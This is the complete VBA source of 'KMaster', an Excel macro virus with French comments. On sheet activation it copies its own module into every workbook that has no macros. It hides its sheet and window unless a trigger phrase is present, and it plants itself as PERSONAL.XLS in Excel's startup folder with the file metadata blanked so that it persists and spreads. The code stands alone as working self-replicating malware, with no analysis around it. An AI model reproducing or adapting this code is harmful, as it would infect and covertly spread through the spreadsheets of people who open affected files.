   Attribute VB_Name = "KMaster"
   Sub Auto_ouvrir()
   Attribute Auto_ouvrir.VB_ProcData.VB_Invoke_Func = " \n14"
       Application.OnSheetActivate = "check_files"
   End Sub

   Sub check_files()
   Attribute check_files.VB_ProcData.VB_Invoke_Func = " \n14"
       Visi = False
       Cible$ = "PERSONAL.XLS"
       Msg$ = "Knowledge is power"
       NomVir$ = "KMaster"

       Application.ScreenUpdating = False
       If ActiveWorkbook.Modules.Count = 0 Then
       'Infecte le classeur actif
       Workbooks(Cible$).Sheets(NomVir$).Copy Before:=ActiveWorkbook.Sheets(1)
       End If
       If ActiveWorkbook.Sheets.Count > 1 Then
         If ActiveSheet.Name = "Feuil1" Then
           If ActiveSheet.Cells(1, 1).Value = Msg$ Then
             Visi = True
             Sheets(NomVir$).Visible = True
           End If

         Else
           If ActiveWorkbook.Name = "VISION.XLS" Then
             If ActiveSheet.Name = NomVir$ Then
                    If Sheets("Feuil1").Cells(1, 1).Value = Msg$ Then Visi = True
             End If
           End If
         End If
       End If



   'fait disparaitre la macro
       If Sheets(NomVir$).Visible <> Visi Then
         If ActiveWorkbook.Name = Cible$ Then
           'Methode classeur
           If ActiveWindow.Visible = True Then ActiveWindow.Visible = False
         Else
           'Methode feuille
           'Au moins une feuille
           If ActiveWorkbook.Sheets.Count = ActiveWorkbook.Modules.Count Then _
           ActiveWorkbook.Worksheets.Add
           'Si la premiere feuillle n'est pas le macro-virus alors le mettre en tete
           If ActiveWorkbook.Sheets(1).Name <> NomVir$ Then _
           ActiveWorkbook.Sheets(NomVir$).Move Before:=ActiveWorkbook.Sheets(1)
           'la cache
           ActiveWorkbook.Sheets(NomVir$).Visible = Visi
         End If
       End If
   'test le fichier de demarrage
       dest$ = Application.StartupPath & "\" & Cible$
       If Dir(dest$) = "" Then
       'creer personnal,xls
       'decache la macro
       Sheets(NomVir$).Visible = True
       Sheets(NomVir$).Select
       Sheets(NomVir$).Copy
       With ActiveWorkbook
       .Title = ""
       .Subject = ""
       .Author = ""
       .Keywords = ""
       .Comments = ""
       End With
       newname$ = ActiveWorkbook.Name
       c4$ = CurDir()
       ChDir Application.StartupPath
       'Cache le classeur
       ActiveWindow.Visible = False
       Workbooks(newname$).SaveAs Filename:=Application.StartupPath & "/" & _
       Cible$, FileFormat:=xlNormal, Password:="", WriteResPassword:="", _
       CreateBackup:=False
       ChDir c4$
       'Cache l'original
       Sheets(NomVir$).Visible = False
       End If
       Application.OnSheetActivate = dest$ & "!check_files"
       Application.ScreenUpdating = True
   End Sub
